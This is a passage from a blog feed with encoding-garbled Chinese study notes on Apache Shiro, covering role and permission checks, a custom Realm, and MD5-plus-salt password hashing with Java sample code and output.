title="shiroä¸­çš„æˆæƒå®ç°"></a>shiroä¸­çš„æˆæƒå®ç°</h1><ul><li>ç¼–ç¨‹å¼:</li></ul><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Subject subject = <span class="module-access"><span class="module"><span class="identifier">SecurityUtils</span>.</span></span>get<span class="constructor">Subject()</span>;</span><br><span class="line"><span class="keyword">if</span>(subject.has<span class="constructor">Role(<span class="string">"admin"</span>)</span>)&#123;</span><br><span class="line"><span class="comment">//æœ‰æƒé™</span></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="comment">//æ— æƒé™</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>æ³¨è§£å¼:</li></ul><figure class="highlight aspectj"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RequiresRoles</span>(<span class="string">"admin"</span>)</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">void</span> <span class="title">hello</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="comment">//æœ‰æƒé™</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>æ ‡ç­¾å¼:</li></ul><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">JSP/GSP æ ‡ç­¾: åœ¨JSP/GSP é¡µé¢é€šè¿‡ç›¸åº”çš„æ ‡ç­¾å®Œæˆï¼š</span><br><span class="line"><span class="tag">&lt;<span class="name">shiro:hasRole</span> <span class="attr">name</span>=<span class="string">"admin"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">!-</span> æœ‰æƒé™ <span class="attr">-</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">shiro:hasRole</span>&gt;</span></span><br><span class="line">æ³¨æ„ï¼šThymeleafä¸­ä½¿ç”¨shiroéœ€è¦é¢å¤–é›†æˆï¼</span><br></pre></td></tr></table></figure><h2 id="å®ç°"><a href="#å®ç°" class="headerlink" title="å®ç°"></a>å®ç°</h2><p>æ¥ç€ä¸Šæ¬¡æˆæƒçš„æ¥<br>åœ¨åé¢æ·»åŠ <br><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//è®¤è¯ç”¨æˆ·è¿›è¡Œæˆæƒ</span></span><br><span class="line"><span class="keyword">if</span>(subject.is<span class="constructor">Authenticated()</span>)&#123;</span><br><span class="line">    <span class="comment">//åŸºäºè§’è‰²æƒé™æ§åˆ¶</span></span><br><span class="line">    <span class="module-access"><span class="module"><span class="identifier">System</span>.</span></span>out.println(subject.has<span class="constructor">Role(<span class="string">"admin"</span>)</span>);;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//åŸºäºå¤šè§’è‰²æƒé™æ§åˆ¶</span></span><br><span class="line">    <span class="module-access"><span class="module"><span class="identifier">System</span>.</span></span>out.println(subject.has<span class="constructor">AllRoles(Arrays.<span class="params">asList</span>(<span class="string">"admin"</span>, <span class="string">"user"</span>)</span>));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">//åŸºäºå…·æœ‰å…¶ä¸­ä¸€ä¸ªè§’è‰²</span></span><br><span class="line">    boolean<span class="literal">[]</span> booleans = subject.has<span class="constructor">Roles(Arrays.<span class="params">asList</span>(<span class="string">"admin"</span>, <span class="string">"super"</span>, <span class="string">"user"</span>)</span>);</span><br><span class="line">    for(boolean aBoolean:booleans)&#123;</span><br><span class="line">        <span class="module-access"><span class="module"><span class="identifier">System</span>.</span></span>out.println(aBoolean);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="module-access"><span class="module"><span class="identifier">System</span>.</span></span>out.println(<span class="string">"=========================================="</span>);</span><br><span class="line">    <span class="comment">//åŸºäºæƒé™å­—ç¬¦ä¸²çš„è®¿é—®æ§åˆ¶ï¼Œèµ„æºæ ‡å¿—ç¬¦:æ“ä½œ:èµ„æºç±»å‹</span></span><br><span class="line">    <span class="module-access"><span class="module"><span class="identifier">System</span>.</span></span>out.println(<span class="string">"æƒé™ï¼š"</span>+subject.is<span class="constructor">Permitted(<span class="string">"user:*:01"</span>)</span>);</span><br><span class="line">    <span class="module-access"><span class="module"><span class="identifier">System</span>.</span></span>out.println(<span class="string">"æƒé™ï¼š"</span>+subject.is<span class="constructor">Permitted(<span class="string">"product:update"</span>)</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//åˆ†åˆ«å…·æœ‰å“ªäº›æƒé™</span></span><br><span class="line">    boolean<span class="literal">[]</span> permitted = subject.is<span class="constructor">Permitted(<span class="string">"user:*:01"</span>, <span class="string">"order:*:10"</span>)</span>;</span><br><span class="line">    for(boolean b : permitted)&#123;</span><br><span class="line">        <span class="module-access"><span class="module"><span class="identifier">System</span>.</span></span>out.println(b);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//åŒæ—¶å…·æœ‰å“ªäº›æƒé™</span></span><br><span class="line">    boolean permittedAll = subject.is<span class="constructor">PermittedAll(<span class="string">"user:*:01"</span>, <span class="string">"product:*"</span>)</span>;</span><br><span class="line">    <span class="module-access"><span class="module"><span class="identifier">System</span>.</span></span>out.println(permittedAll);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>åœ¨CustomerMd5Realmä¸­æ·»åŠ <br><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">@Override</span><br><span class="line">protected AuthorizationInfo <span class="keyword">do</span><span class="constructor">GetAuthorizationInfo(PrincipalCollection <span class="params">principalCollection</span>)</span> &#123;</span><br><span class="line">    String primaryPrincipal = (String)principalCollection.get<span class="constructor">PrimaryPrincipal()</span>;</span><br><span class="line">    <span class="module-access"><span class="module"><span class="identifier">System</span>.</span></span>out.println(<span class="string">"èº«ä»½ä¿¡æ¯:"</span>+primaryPrincipal);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//æ ¹æ®èº«ä»½ä¿¡æ¯  ç”¨æˆ·å è·å–å½“å‰ç”¨æˆ·çš„è§’è‰²ä¿¡æ¯ï¼Œä»¥åŠæƒé™ä¿¡æ¯  xiaochen admin user</span></span><br><span class="line">    SimpleAuthorizationInfo simpleAuthorizationInfo = <span class="keyword">new</span> <span class="constructor">SimpleAuthorizationInfo()</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//å°†æ•°æ®åº“ä¸­æŸ¥è¯¢çš„è§’è‰²ä¿¡æ¯èµ‹å€¼ç»™æƒé™å¯¹è±¡</span></span><br><span class="line">    simpleAuthorizationInfo.add<span class="constructor">Role(<span class="string">"admin"</span>)</span>;</span><br><span class="line">    simpleAuthorizationInfo.add<span class="constructor">Role(<span class="string">"user"</span>)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//å°†æ•°æ®åº“ä¸­æŸ¥è¯¢æƒé™ä¿¡æ¯èµ‹å€¼ä¸ªæƒé™å¯¹è±¡</span></span><br><span class="line">    simpleAuthorizationInfo.add<span class="constructor">StringPermission(<span class="string">"user:*:01"</span>)</span>;</span><br><span class="line">    simpleAuthorizationInfo.add<span class="constructor">StringPermission(<span class="string">"product:create:02"</span>)</span>;</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    return simpleAuthorizationInfo;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>åˆ°è¿™é‡Œshiroä¸­çš„æˆæƒå°±å®Œæˆäº†</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;shiroä¸­æˆæƒçš„æ¦‚å¿µ&quot;&gt;&lt;a href=&quot;#shiroä¸­æˆæƒçš„æ¦‚å¿µ&quot; class=&quot;headerlink&quot; title=&quot;shiroä¸­æˆæƒçš„æ¦‚å¿µ&quot;&gt;&lt;/a&gt;shiroä¸­æˆæƒçš„æ¦‚å¿µ&lt;/h1&gt;&lt;h2 id=&quot;æˆæƒ&quot;&gt;&lt;a href=&quot;#æˆæƒ&quot; class=&quot;head
      
    
    </summary>
    
    
      <category term="æ—¥å¸¸å­¦ä¹ " scheme="http://yoursite.com/categories/%E6%97%A5%E5%B8%B8%E5%AD%A6%E4%B9%A0/"/>
    
      <category term="JavaWeb" scheme="http://yoursite.com/categories/%E6%97%A5%E5%B8%B8%E5%AD%A6%E4%B9%A0/JavaWeb/"/>
    
    
      <category term="å¼€å‘" scheme="http://yoursite.com/tags/%E5%BC%80%E5%8F%91/"/>
    
  </entry>
  
  <entry>
    <title>Shiro-2020/11/17-MD5+Salt</title>
    <link href="http://yoursite.com/2020/11/17/Shiro-2020-11-17-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    <id>http://yoursite.com/2020/11/17/Shiro-2020-11-17-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</id>
    <published>2020-11-17T07:45:14.000Z</published>
    <updated>2021-02-21T04:57:46.663Z</updated>
    
    <content type="html"><![CDATA[<h1 id="shiroä¸­è‡ªå®šä¹‰Realmçš„å®ç°"><a href="#shiroä¸­è‡ªå®šä¹‰Realmçš„å®ç°" class="headerlink" title="shiroä¸­è‡ªå®šä¹‰Realmçš„å®ç°"></a>shiroä¸­è‡ªå®šä¹‰Realmçš„å®ç°</h1><ol><li><p>æœ€ç»ˆæ‰§è¡Œç”¨æˆ·åæ¯”è¾ƒ SimpleAccountRealm doGetAuthenticationInfo åœ¨è¿™ä¸ªæ–¹æ³•ä¸­å®Œæˆç”¨æˆ·åæ ¡éªŒ</p></li><li><p>æœ€ç»ˆå¯†ç æ ¡éªŒæ˜¯åœ¨AuthenticatingRealmä¸­ assertCredentialsMatch</p></li></ol><p>æ€»ç»“ï¼š</p><ul><li><p>AuthenticatingRealm è®¤è¯realm doGetAuthenticationInfo</p></li><li><p>AuthorizingRealm æˆæƒrealm doGetAuthorizationInfo</p></li></ul><p>è‡ªå®šä¹‰Realmçš„ç›®çš„å°±æ˜¯ä¸ºäº†æŠ›å¼ƒæ‰inié…ç½®æ–‡ä»¶</p><p>å®ç°ä¸æ•°æ®åº“å’Œä»¥åSpringçš„è¿æ¥</p><p>åˆ›å»ºä¸€ä¸ªrealmåŒ…ç”¨äºå­˜æ”¾æˆ‘ä»¬è‡ªå®šä¹‰çš„CustomerRealm<br><figure class="highlight scala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ceit.realm;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.authc.<span class="type">AuthenticationException</span>;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.authc.<span class="type">AuthenticationInfo</span>;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.authc.<span class="type">AuthenticationToken</span>;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.authc.<span class="type">SimpleAuthenticationInfo</span>;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.authz.<span class="type">AuthorizationInfo</span>;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.realm.<span class="type">AuthorizingRealm</span>;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.subject.<span class="type">PrincipalCollection</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * è‡ªå®šä¹‰realmå®ç°  å°†è®¤è¯/æˆæƒæ•°æ®çš„æ¥æºè½¬ä¸ºæ•°æ®åº“</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line">public <span class="class"><span class="keyword">class</span> <span class="title">CustomerRealm</span> <span class="keyword">extends</span> <span class="title">AuthorizingRealm</span> </span>&#123;</span><br><span class="line">    <span class="comment">//æˆæƒ</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="type">AuthorizationInfo</span> doGetAuthorizationInfo(<span class="type">PrincipalCollection</span> principalCollection) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//è®¤è¯</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="type">AuthenticationInfo</span> doGetAuthenticationInfo(<span class="type">AuthenticationToken</span> authenticationToken) <span class="keyword">throws</span> <span class="type">AuthenticationException</span> &#123;</span><br><span class="line">        <span class="comment">//åœ¨tokenä¸­è·å–ç”¨æˆ·å</span></span><br><span class="line">        <span class="type">String</span> principal = (<span class="type">String</span>)authenticationToken.getPrincipal();</span><br><span class="line">        <span class="type">System</span>.out.println(principal);</span><br><span class="line">        <span class="comment">//æ ¹æ®èº«ä»½ä¿¡æ¯ä½¿ç”¨JDBC MybatisæŸ¥è¯¢ç›¸å…³æ•°æ®åº“</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="string">"xiaochen"</span>.equals(principal))&#123;</span><br><span class="line">            <span class="comment">//å‚æ•°1ï¼šæ•°æ®åº“ä¸­æŸ¥è¯¢åˆ°çš„ç”¨æˆ·å   //å‚æ•°2ï¼šè¿”å›æ•°æ®åº“ä¸­æ­£ç¡®å¯†ç   //å‚æ•°3ï¼šæä¾›å½“å‰realmçš„åå­— this.getName();</span></span><br><span class="line">            <span class="type">SimpleAuthenticationInfo</span> simpleAuthenticationInfo = <span class="keyword">new</span> <span class="type">SimpleAuthenticationInfo</span>(principal,<span class="string">"123"</span>,<span class="keyword">this</span>.getName());</span><br><span class="line">            <span class="keyword">return</span> simpleAuthenticationInfo;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>å†™ä¸€ä¸ªç±»æ¥æµ‹è¯•ä¸€ä¸‹<br>TestCustomerRealmAuthenticator<br><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">package com.ceit;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.ceit.realm.CustomerRealm;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.SecurityUtils;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.authc.AuthenticationException;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.authc.IncorrectCredentialsException;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.authc.UnknownAccountException;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.authc.UsernamePasswordToken;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.mgt.DefaultSecurityManager;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.mgt.SecurityManager;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.subject.Subject;</span><br><span class="line"></span><br><span class="line"><span class="comment">//ä½¿ç”¨è‡ªå®šä¹‰realm</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestCustomerRealmAuthenticator</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> void main(<span class="type">String</span>[] args) &#123;</span><br><span class="line">        <span class="comment">//åˆ›å»ºsecurityManager</span></span><br><span class="line">        <span class="type">DefaultSecurityManager</span> defaultSecurityManager = new <span class="type">DefaultSecurityManager</span>();</span><br><span class="line">        <span class="comment">//è®¾ç½®è‡ªå®šä¹‰realm</span></span><br><span class="line">        defaultSecurityManager.setRealm(new <span class="type">CustomerRealm</span>());</span><br><span class="line">        <span class="comment">//å°†å®‰å…¨å·¥å…·ç±»è®¾ç½®å®‰å…¨å·¥å…·ç±»</span></span><br><span class="line">        <span class="type">SecurityUtils</span>.setSecurityManager(defaultSecurityManager);</span><br><span class="line">        <span class="comment">//é€šè¿‡å®‰å…¨å·¥å…·ç±»è·å–subject</span></span><br><span class="line">        <span class="type">Subject</span> subject = <span class="type">SecurityUtils</span>.getSubject();</span><br><span class="line">        <span class="comment">//åˆ›å»ºtoken</span></span><br><span class="line">        <span class="type">UsernamePasswordToken</span> token = new <span class="type">UsernamePasswordToken</span>(<span class="string">"xiaochen"</span>, <span class="string">"123"</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            subject.login(token);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (<span class="type">UnknownAccountException</span> e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">            <span class="type">System</span>.out.<span class="built_in">println</span>(<span class="string">"ç”¨æˆ·åé”™è¯¯"</span>);</span><br><span class="line">        &#125;<span class="keyword">catch</span> (<span class="type">IncorrectCredentialsException</span> e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">            <span class="type">System</span>.out.<span class="built_in">println</span>(<span class="string">"å¯†ç é”™è¯¯"</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>è¿™æ ·è‡ªå®šä¹‰çš„realmå°±å†™å¥½äº†  ä»¥ååªéœ€è¦å°†CustomerRealmä¸­<br><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//æ ¹æ®èº«ä»½ä¿¡æ¯ä½¿ç”¨JDBC MybatisæŸ¥è¯¢ç›¸å…³æ•°æ®åº“</span></span><br><span class="line"><span class="keyword">if</span> (<span class="string">"xiaochen"</span>.equals(principal))&#123;</span><br><span class="line">    <span class="comment">//å‚æ•°1ï¼šæ•°æ®åº“ä¸­æŸ¥è¯¢åˆ°çš„ç”¨æˆ·å   //å‚æ•°2ï¼šè¿”å›æ•°æ®åº“ä¸­æ­£ç¡®å¯†ç   //å‚æ•°3ï¼šæä¾›å½“å‰realmçš„åå­— this.getName();</span></span><br><span class="line">    SimpleAuthenticationInfo simpleAuthenticationInfo = <span class="keyword">new</span> <span class="constructor">SimpleAuthenticationInfo(<span class="params">principal</span>,<span class="string">"123"</span>,<span class="params">this</span>.<span class="params">getName</span>()</span>);</span><br><span class="line">    return simpleAuthenticationInfo;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>ä¿®æ”¹ä¸ºJDBCæˆ–Mybatiså³å¯</p><h1 id="MD5å’ŒSaltçš„ç®€ä»‹å’Œæ‰§è¡Œæµç¨‹è¯´æ˜"><a href="#MD5å’ŒSaltçš„ç®€ä»‹å’Œæ‰§è¡Œæµç¨‹è¯´æ˜" class="headerlink" title="MD5å’ŒSaltçš„ç®€ä»‹å’Œæ‰§è¡Œæµç¨‹è¯´æ˜"></a>MD5å’ŒSaltçš„ç®€ä»‹å’Œæ‰§è¡Œæµç¨‹è¯´æ˜</h1><p>åˆšæ‰è™½ç„¶å®Œæˆäº†è‡ªå®šä¹‰realmçš„å®ç°ï¼Œä½†æ˜¯è¿˜æœ‰ä¸€ä¸ªé—®é¢˜å°±æ˜¯ï¼Œè®¤è¯ç”¨çš„å¯†ç è¿˜åœ¨æ˜¯æ˜æ–‡å­˜å‚¨çš„ </p><p>ä¸€èˆ¬å¼€å‘ä¸­éƒ½æ˜¯åŠ å¯†å’ŒåŠ ç›çš„  é¿å…å®‰å…¨éšæ‚£(sqlæ³¨å…¥)</p><ul><li><p>MD5ç®—æ³•ï¼š</p><ul><li><p>ä½œç”¨ï¼šä¸€èˆ¬ç”¨æ¥åŠ å¯† æˆ–è€… ç­¾å(æ£€éªŒå’Œ)</p></li><li><p>ç‰¹ç‚¹ï¼šMD5ç®—æ³•ä¸å¯é€†  å¦‚æœå†…å®¹ç›¸åŒæ— è®ºæ‰§è¡Œå¤šå°‘æ¬¡md5ç”Ÿæˆç»“æœå§‹ç»ˆæ˜¯ä¸€è‡´çš„</p></li><li><p>ç”Ÿæˆç»“æœï¼šå§‹ç»ˆæ˜¯ä¸€ä¸ª16è¿›åˆ¶ 32ä½é•¿åº¦å­—ç¬¦ä¸²</p></li></ul></li></ul><h2 id="MD5-Saltå®ç°"><a href="#MD5-Saltå®ç°" class="headerlink" title="MD5+Saltå®ç°"></a>MD5+Saltå®ç°</h2><p>å…ˆæ¥æµ‹è¯•ä¸€ä¸‹md5çš„ç”¨æ³•<br>TestShiroMD5<br><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">package com.ceit;</span><br><span class="line"></span><br><span class="line">import org.apache.shiro.crypto.hash.Md5Hash;</span><br><span class="line"></span><br><span class="line">public <span class="keyword">class</span> TestShiroMD5 &#123;</span><br><span class="line">    public static void main(String<span class="literal">[]</span> args) &#123;</span><br><span class="line">        <span class="comment">//åˆ›å»ºä¸€ä¸ªmd5ç®—æ³•</span></span><br><span class="line"><span class="comment">//        Md5Hash md5Hash = new Md5Hash();</span></span><br><span class="line"><span class="comment">//        md5Hash.setBytes("123".getBytes());</span></span><br><span class="line"><span class="comment">//        String s = md5Hash.toHex();</span></span><br><span class="line"><span class="comment">//        System.out.println(s);</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//ä½¿ç”¨md5</span></span><br><span class="line">        Md5Hash md5Hash = <span class="keyword">new</span> <span class="constructor">Md5Hash(<span class="string">"123"</span>)</span>;</span><br><span class="line">        <span class="module-access"><span class="module"><span class="identifier">System</span>.</span></span>out.println(md5Hash.<span class="keyword">to</span><span class="constructor">Hex()</span>);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//ä½¿ç”¨md5+saltå¤„ç†</span></span><br><span class="line">        Md5Hash md5Hash1 = <span class="keyword">new</span> <span class="constructor">Md5Hash(<span class="string">"123"</span>,<span class="string">"X0*7ps"</span>)</span>;</span><br><span class="line">        <span class="module-access"><span class="module"><span class="identifier">System</span>.</span></span>out.println(md5Hash1.<span class="keyword">to</span><span class="constructor">Hex()</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//ä½¿ç”¨md5 + salt + hashæ•£åˆ—</span></span><br><span class="line">        Md5Hash md5Hash2 = <span class="keyword">new</span> <span class="constructor">Md5Hash(<span class="string">"123"</span>, <span class="string">"X0*7ps"</span>, 1024)</span>;</span><br><span class="line">        <span class="module-access"><span class="module"><span class="identifier">System</span>.</span></span>out.println(md5Hash2);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>è¿è¡Œç»“æœ<br><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">202</span>cb<span class="number">962</span>ac<span class="number">59075</span>b<span class="number">964</span>b<span class="number">07152</span>d<span class="number">234</span>b<span class="number">70</span></span><br><span class="line"><span class="number">8</span>a<span class="number">83592</span>a<span class="number">02263</span>bfe<span class="number">6752</span>b<span class="number">2</span>b<span class="number">5</span>b<span class="number">03</span>a<span class="number">4799</span></span><br><span class="line">e<span class="number">4</span>f<span class="number">9</span>bf<span class="number">3e0</span><span class="keyword">c</span><span class="number">58</span>f<span class="number">045e62</span><span class="keyword">c</span><span class="number">23</span><span class="keyword">c</span><span class="number">533</span>fcf<span class="number">633</span></span><br></pre></td></tr></table></figure></p><p>åˆ›å»ºä¸€ä¸ªCustomerMd5Realm<br><figure class="highlight scala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ceit.realm;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.authc.<span class="type">AuthenticationException</span>;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.authc.<span class="type">AuthenticationInfo</span>;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.authc.<span class="type">AuthenticationToken</span>;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.authc.<span class="type">SimpleAuthenticationInfo</span>;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.authz.<span class="type">AuthorizationInfo</span>;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.realm.<span class="type">AuthorizingRealm</span>;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.subject.<span class="type">PrincipalCollection</span>;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.util.<span class="type">ByteSource</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * ä½¿ç”¨è‡ªå®šä¹‰realm åŠ å…¥md5 + salt +hash</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">public <span class="class"><span class="keyword">class</span> <span class="title">CustomerMd5Realm</span> <span class="keyword">extends</span> <span class="title">AuthorizingRealm</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="type">AuthorizationInfo</span> doGetAuthorizationInfo(<span class="type">PrincipalCollection</span> principalCollection) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span 